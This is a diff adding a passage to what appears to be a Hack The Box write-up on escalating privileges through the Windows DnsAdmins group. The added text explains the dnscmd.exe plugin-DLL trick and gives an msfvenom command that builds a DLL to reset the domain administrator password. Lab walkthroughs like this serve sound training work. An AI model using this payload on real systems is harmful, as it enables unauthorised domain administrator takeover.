@@ -218,3 +218,12 @@ Any changes made to the system will have to be completely used within a minute (
 ### Groups (DNSAdmin)
 Members of DNSAdmins group have access to network DNS information. The default permissions are as follows: Allow: Read, Write, Create All Child objects, Delete Child objects, Special Permissions. By default the DNSAdmins don’t have the ability to start or stop the DNS service, but it’s not unusual for an admin to give this group that privilege.
 ![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/9e20d82d-2ceb-4239-9718-be3ff15717ca)
+
+The user ryan is found to be a member of DnsAdmins. Being a member of the DnsAdmins group allows the use of dnscmd.exe to specify a plugin DLL that should be loaded by the DNS service. 
+
+### MSFVenom DLL
+  - Create a payload that changes the administrator password.
+```CSS
+▶ msfvenom -p windows/x64/exec cmd='net user administrator P@s5w0rd123! /domain' -f dll > payload.dll
+```
+
